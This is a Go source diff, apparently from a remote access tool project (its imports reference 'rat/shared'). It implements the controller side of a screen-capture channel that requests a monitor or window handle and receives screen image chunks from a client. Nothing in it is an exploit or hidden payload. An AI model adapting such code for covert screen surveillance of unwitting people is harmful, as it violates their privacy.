@@ -1,12 +1,15 @@
 package main
 
 import (
-	"fmt"
+	"encoding/binary"
 	"io"
 	"rat/shared/network/header"
 )
 
 type ScreenChannel struct {
+	Monitor bool
+	Handle  int32
+
 	controller *Controller
 }
 
@@ -14,15 +17,52 @@ func (ScreenChannel) Header() header.PacketHeader {
 	return header.ScreenHeader
 }
 
-func (sc ScreenChannel) Open(r io.ReadWriteCloser, c *Client) error {
-	defer r.Close()
+func (sc ScreenChannel) Open(channel io.ReadWriteCloser, c *Client) error {
+	defer channel.Close()
 
 	listener := sc.controller.Listen(ScreenEvent, c)
 	defer listener.Unlisten()
 
-	fmt.Println("channel open")
+	var err error
+	err = binary.Write(channel, binary.LittleEndian, sc.Monitor)
+	if err != nil {
+		return err
+	}
 
-	return nil
+	err = binary.Write(channel, binary.LittleEndian, sc.Handle)
+
+	for err == nil {
+		var left, top, width, height int32
+
+		binary.Read(channel, binary.LittleEndian, &left)
+		binary.Read(channel, binary.LittleEndian, &top)
+		binary.Read(channel, binary.LittleEndian, &width)
+		err = binary.Read(channel, binary.LittleEndian, &height)
+		if err != nil {
+			break
+		}
+
+		var len int32
+		err = binary.Read(channel, binary.LittleEndian, &len)
+
+		if err != nil {
+			break
+		}
+
+		buf := make([]byte, len)
+		_, err = io.ReadFull(channel, buf)
+
+		sendMessage(sc.controller, c, ScreenChunkMessage{
+			Buffer: buf,
+			X:      int(left),
+			Y:      int(top),
+			Width:  int(width),
+			Height: int(height),
+		})
+
+	}
+
+	return err
 }
 
 /*
